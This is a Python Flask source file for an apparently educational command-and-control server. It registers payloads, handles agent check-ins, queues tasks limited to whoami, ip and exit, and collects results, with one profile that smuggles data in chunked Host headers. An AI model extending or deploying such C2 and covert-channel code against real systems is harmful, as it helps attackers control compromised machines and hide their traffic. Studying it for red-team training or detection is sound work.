import json
import os
from secrets import compare_digest, token_hex
from uuid import uuid4
from flask import Flask, abort, flash, redirect, render_template, request, session, url_for
from werkzeug.exceptions import HTTPException
from database import create_callback, create_payload, create_task, get_callback_id, get_next_task, get_payload, get_callback_payload_id, get_state, init_db, poll_task, save_result
import time
from profiles import (
    PROFILES, validate_profile,
    parse_host_header, decode_host_data,
    HOST_PART_SIZE, HOST_MAX_BYTES,
)


app = Flask(__name__)
app.secret_key = token_hex(32)
app.config.update(
    MAX_CONTENT_LENGTH=65536,
    SESSION_COOKIE_SAMESITE="Strict",
    SESSION_COOKIE_HTTPONLY=True,
)

HOST_MESSAGES = {}


def assemble_host_message(message_id, number, total, part):
    max_parts = ((HOST_MAX_BYTES * 8 + 4) // 5 + HOST_PART_SIZE - 1) // HOST_PART_SIZE
    if not 1 <= number <= total <= max_parts:
        raise ValueError("Неверный номер части")
    now = time.monotonic()
    for key, value in list(HOST_MESSAGES.items()):
        if now - value["updated"] > 60:
            del HOST_MESSAGES[key]
    if message_id not in HOST_MESSAGES and len(HOST_MESSAGES) >= 100:
        raise ValueError("Слишком много незавершённых сообщений")
    state = HOST_MESSAGES.setdefault(message_id, {
        "total": total, "parts": {}, "updated": now,
    })
    old = state["parts"].get(number)
    if state["total"] != total or (old is not None and old != part):
        raise ValueError("Части противоречат друг другу")
    state["parts"][number] = part
    state["updated"] = now
    if len(state["parts"]) != total:
        return None
    encoded = "".join(state["parts"][i] for i in range(1, total + 1))
    del HOST_MESSAGES[message_id]
    return decode_host_data(encoded)


@app.errorhandler(HTTPException)
def http_error(error):
    response = error.get_response()
    response.data = json.dumps({"error": error.description}, ensure_ascii=False)
    response.content_type = "application/json"
    return response


def read_profile_data(operation):
    payload_uuid = request.headers.get("X-Payload-UUID")
    if not payload_uuid:
        abort(400, "Нужен заголовок X-Payload-UUID")
    payload = get_payload(payload_uuid)
    if payload is None:
        abort(404, "Payload не найден")
    rule = payload["profile"][operation]
    if request.method != rule["method"]:
        abort(405, "Метод не соответствует профилю")

    if rule["transport"] == "json":
        if not request.is_json:
            abort(415, "Профиль требует application/json")
        source = request.get_json(silent=True)
        if source is None or not hasattr(source, "get"):
            abort(400, "Нужен объект с полями запроса")
        value = source.get(rule["field"])
    elif rule["transport"] == "form":
        if request.mimetype != "application/x-www-form-urlencoded":
            abort(415, "Профиль требует application/x-www-form-urlencoded")
        value = request.form.get(rule["field"])
    elif rule["transport"] == "query":
        value = request.args.get(rule["field"])
    elif rule["transport"] == "host":
        parsed = parse_host_header(request.headers.get("Host", ""))
        if parsed is None:
            abort(400, "Неверный Host")
        message_id, number, total, part = parsed
        try:
            assembled = assemble_host_message(message_id, number, total, part)
        except ValueError as error:
            code = 409 if "противоречат" in str(error) else 400
            abort(code, str(error))
        if assembled is None:
            return {"__host_partial__": True, "received": number, "total": total}, payload["id"]
        value = assembled
        if operation == "post_task":
            try:
                value = json.loads(value)
            except (TypeError, ValueError):
                abort(400, "В Host нужна JSON-строка результата")
    else:
        abort(400, "Неизвестный transport")

    if operation == "post_task":
        if rule["transport"] not in ("json", "host"):
            try:
                value = json.loads(value)
            except (TypeError, ValueError):
                abort(400, "В поле результата нужна JSON-строка")
        if not isinstance(value, dict):
            abort(400, "Результат должен быть объектом")
        callback_uuid = value.get("callback_uuid")
    else:
        if not isinstance(value, str) or not value:
            abort(400, f"Нужно поле {rule['field']}")
        callback_uuid = value
    if operation == "checkin":
        if value != payload_uuid:
            abort(403, "Payload в поле и заголовке не совпадают")
    else:
        if not isinstance(callback_uuid, str) or not callback_uuid:
            abort(400, "Нужен callback_uuid")
        owner = get_callback_payload_id(callback_uuid)
        if owner is None:
            abort(404, "Callback не найден")
        if owner != payload["id"]:
            abort(403, "Callback относится к другому payload")
    return value, payload["id"]

def task_json(task):
    if task is None:
        return {"task": None}
    return {"task": {"task_id": task[0], "command": task[1]}}


def add_task_data(data):
    callback_uuid = data.get("callback_uuid")
    command = data.get("command")
    if not isinstance(callback_uuid, str) or not callback_uuid:
        return {"error": "callback_uuid required"}, 400
    if command not in ("whoami", "ip", "exit"):
        return {"error": "дай норм команду"}, 400
    try:
        task_id = create_task(callback_uuid, command)
    except ValueError as error:
        return {"error": str(error)}, 409
    if task_id is None:
        return {"error": "колбека такого нету"}, 404
    return {"task_id": task_id, "status": "pending"}, 201


@app.get("/ping")
def ping():
    return {"message": "pong", "status": "ok"}


@app.get("/favicon.ico")
def favicon():
    return "", 204


@app.route("/checkin", methods=["GET", "POST"])
def checkin():
    value, payload_id = read_profile_data("checkin")
    if isinstance(value, dict) and value.get("__host_partial__"):
        return {"received": value["received"], "total": value["total"]}
    callback_uuid = str(uuid4())
    create_callback(callback_uuid, payload_id)
    return {"callback_uuid": callback_uuid}, 201


@app.post("/payloads")
def add_payload():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return {"error": "ДЖЕЙСОНА ДАЙ"}, 400
    profile = data.get("profile", "standard")
    if isinstance(profile, str):
        profile = PROFILES.get(profile)
    try:
        validate_profile(profile)
    except ValueError as error:
        return {"error": str(error)}, 400
    payload_uuid = str(uuid4())
    create_payload(payload_uuid, profile)
    return {"payload_uuid": payload_uuid, "profile": profile}, 201


@app.post("/tasks")
def add_task():
    data = request.get_json(silent=True)
    if not isinstance(data, dict):
        return {"error": "ДЖЕЙСОНА ДАЙ"}, 400
    return add_task_data(data)


@app.get("/tasks/<callback_uuid>")
def next_task(callback_uuid):
    callback_id = get_callback_id(callback_uuid)
    if callback_id is None:
        return {"error": "callback not found"}, 404
    return task_json(get_next_task(callback_id))


@app.route("/poll", methods=["GET", "POST"])
def poll():
    callback_uuid, _ = read_profile_data("get_task")
    if isinstance(callback_uuid, dict) and callback_uuid.get("__host_partial__"):
        return {"received": callback_uuid["received"], "total": callback_uuid["total"]}
    try:
        task = poll_task(callback_uuid)
    except LookupError as error:
        return {"error": str(error)}, 404
    except ValueError as error:
        return {"error": str(error)}, 410
    return task_json(task)


@app.route("/results", methods=["GET", "POST"])
def results():
    data, _ = read_profile_data("post_task")
    if isinstance(data, dict) and data.get("__host_partial__"):
        return {"received": data["received"], "total": data["total"]}
    if not isinstance(data.get("callback_uuid"), str) or type(data.get("task_id")) is not int:
        return {"error": "Нужны callback_uuid и целый task_id"}, 400
    result = data.get("result")
    if not isinstance(result, str) or len(result) > 20000:
        return {"error": "Результат должен быть строкой до 20000 символов"}, 400
    try:
        save_result(data["callback_uuid"], data["task_id"], result)
    except LookupError as error:
        return {"error": str(error)}, 404
    except ValueError as error:
        return {"error": str(error)}, 409
    return {"status": "completed"}


@app.get("/state")
def state():
    return get_state()


@app.get("/")
def index():
    if "csrf" not in session:
        session["csrf"] = token_hex(24)
    return render_template(
        "index.html", **get_state(), csrf=session["csrf"],
        selected=request.args.get("callback"), command=request.args.get("command", "whoami")
    )


@app.post("/ui/tasks")
def ui_task():
    token = request.form.get("csrf", "")
    if not token.isascii() or not session.get("csrf") or not compare_digest(token, session["csrf"]):
        return "Обнови страницу и попробуй ещё раз", 403
    data, status = add_task_data(request.form)
    flash(data["error"] if status != 201 else f"Задача №{data['task_id']} добавлена")
    return redirect(url_for(
        "index", callback=request.form.get("callback_uuid"), command=request.form.get("command")
    ), code=303)


@app.after_request
def headers(response):
    response.headers["Cache-Control"] = "no-store"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; style-src 'self'; script-src 'none'; "
        "frame-ancestors 'none'; form-action 'self'; base-uri 'self'"
    )
    return response


if __name__ == "__main__":
    init_db()
    app.run(host="127.0.0.1", port=int(os.environ.get("BOT_PORT", "5000")))
